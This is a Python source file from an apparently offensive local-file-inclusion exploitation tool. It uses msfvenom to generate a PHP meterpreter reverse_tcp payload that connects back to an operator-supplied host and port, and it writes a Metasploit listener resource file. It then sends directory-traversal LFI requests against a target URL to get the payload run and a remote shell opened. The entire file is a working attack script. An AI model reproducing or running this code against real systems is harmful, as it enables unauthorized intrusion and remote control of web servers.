import random
import string
import subprocess
import sys

import requests

PATH_TRAVERSAL = ['../', '..\\', '/../', './../']


class Generator:
    """generate random name for the shell
    """

    def __init__(self, size=8, chars=string.ascii_lowercase + string.digits):
        self.size = size
        self.chars = chars

    def generate(self):
        value = ''.join(random.choice(self.chars) for _ in range(self.size))
        return value


class Payload:
    """Generate payload that could be used by Metasploit
    """

    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def handler(self):
        opt = "use multi/handler\n"
        opt += "set payload php/meterpreter/reverse_tcp\n"
        opt += "set LHOST {0}\n set LPORT {1}\n".format(self.lhost, self.lport)
        opt += "set ExitOnSession false\n"
        opt += "exploit -j\n"
        with open("php_listener.rc", "w") as f:
            f.write(opt)
        print(colors("[+] Generated Metasploit Resource File", 92))
        print(colors("[~] Load Metasploit: msfconsole -r php_listener.rc", 93))


def msf_payload():
    """Use msfvenom to generate reverse shell payload
    """

    lhost = input(colors("[?] Host For Callbacks: ", 94))
    lport = input(colors("[?] Port For Callbacks: ", 94))

    g = Generator()
    shell = g.generate()

    print(colors("[~] Generating Metasploit Payload", 93))

    # TODO: Check if msfvenom exists or not
    php = "/usr/bin/msfvenom -a php --platform php -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f raw > /tmp/{2}.php".format(  # noqa
        lhost, lport, shell)

    try:
        msf = subprocess.Popen(php, shell=True)
        msf.wait()
        if msf.returncode != 0:
            print(colors("[!] Error Generating MSF Payload ", 91))
            sys.exit(1)
        else:
            print(colors("[+] Success! ", 92))
            print(colors("[~] Payload: /tmp/{0}.php", 93).format(shell))

    except OSError as e:
        print(e)

    return lhost, lport, shell


def colors(string, color):
    """Make things colorfull

    Arguments:
        string {str} -- String to apply colors on
        color {int} -- value of color to apply

    """
    return("\033[%sm%s\033[0m" % (color, string))


def cook(cookies):
    c = dict(item.split("=") for item in cookies.split(";"))
    return c


def attack(target, location, cookies=None, headers=None, payload=None, traverse=False, relative=False, data=None):
    """Perform specified type of LFI attack

    Arguments:
        target {str} -- Target URL
        location {str} -- Specific location to test

    Keyword Arguments:
        cookies {str} -- Authenticate with cookies (default: {None})
        headers {str} -- Specify headers (default: {None})
        payload {str} -- Custom payload (default: {None})
        traverse {bool} -- traverse the URL (default: {False})
        relative {bool} -- check for relative URL (default: {False})
    """

    url = target+location
    print(colors("[~] Testing: {}".format(url), 93))
    try:
        response = requests.get(url, headers=headers, cookies=cookies)

        if response.status_code != 200:
            print(colors("[!] Unexpected HTTP Response ", 91))
            sys.exit(1)
        if not relative:
            r = requests.get(url)
            print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))
            if r.status_code != 200:
                print(colors("[!] Unexpected HTTP Response ", 91))

        else:
            for traversal in PATH_TRAVERSAL:
                for i in range(10):
                    lfi = target + traversal * i + location
                    r = requests.get(lfi, headers=headers, cookies=cookies)
                    if r.status_code != 200:
                        print(colors("[!] Unexpected HTTP Response ", 91))
            print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))

    except Exception as e:
        print(colors("[!] HTTP Error", 91))
        print(e)
        sys.exit(1)
